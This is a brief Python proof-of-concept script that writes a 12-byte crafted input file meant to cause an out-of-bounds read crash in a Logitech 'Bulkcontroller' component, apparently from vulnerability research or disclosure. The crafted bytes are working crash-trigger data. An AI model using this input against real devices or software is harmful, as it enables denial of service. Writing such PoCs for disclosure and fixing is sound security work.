#!/usr/bin/env python3
import argparse
from pathlib import Path


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Generate Logitech Bulkcontroller OOB read crash input."
    )
    parser.add_argument(
        "-o",
        "--output",
        default="poc_oob_read.bin",
        help="Output path (default: poc_oob_read.bin in CWD).",
    )
    args = parser.parse_args()

    data = bytes(
        [
            0x06,
            0xCC,
            0x00,
            0x00,
            0x00,
            0x00,
            0x10,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
        ]
    )

    out_path = Path(args.output)
    out_path.write_bytes(data)
    print(f"Wrote {len(data)} bytes to {out_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
